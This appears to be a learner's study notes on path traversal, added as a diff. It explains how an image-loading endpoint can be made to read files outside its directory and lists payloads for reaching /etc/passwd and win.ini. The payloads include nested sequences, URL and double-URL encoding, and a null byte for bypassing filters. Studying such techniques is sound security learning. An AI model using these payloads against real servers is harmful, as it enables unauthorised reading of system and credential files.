@@ -1,0 +1,66 @@
+This is a standard way of loading images on a website:
+<img src="/loadImage?fiulename=218.png">
+
+This file is stroed on a disc in this location:
+var/www/images
+
+to return an image the application appends the requested file name to the base directory 
+and uses a file system API to read the contents of the file.
+
+Therefore for this request:
+/loadfile?filename=218.png
+
+the application reads from this file path:
+/var/www/images/218.png
+
+
+Potential request to get the details of the users on the server:
+https://WEBSITENAME.com/loadImage?filename=../../../etc/passwd
+
+
+this arbitray code reads from the directory of:
+/var/www/images/../../../etc/passwd
+
+
+For windows systems to get the same info an attacker can run the following:
+https://WEBSITENAME.com/loadImage?filename=../../../windows/win.ini
+
+
+
+might also be able to use the absolute path from the file system
+filename=/etc/passwd
+
+
+
+
+could aslo use nested traversal sequences, which will reverse to simple traversal sequences
+when the inner sequence is stripped:
+
+....// OR ....\/
+
+....//....//....//etc/passwd
+
+
+
+URL encoding or double URL encoding the ../ characters can allow to sanatize past the website validation
+
+..%c0%af OR ..%252f
+
+e.g. %25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66etc/passwd
+
+
+
+
+if the name has to start with the expected base folder, then it might be possible to enclude the base folder, followed by suitable traversal sequences
+
+filename=/var/www/images/../../../etc/passwd
+
+
+
+if the application requires for the file name to end with a file extension ".png" for example
+then we can use a null bite to affectively terminate the file path before the file extension
+
+filename=../../../etc/passwd%00.png
+
+^^this cuts out the .png extension
+
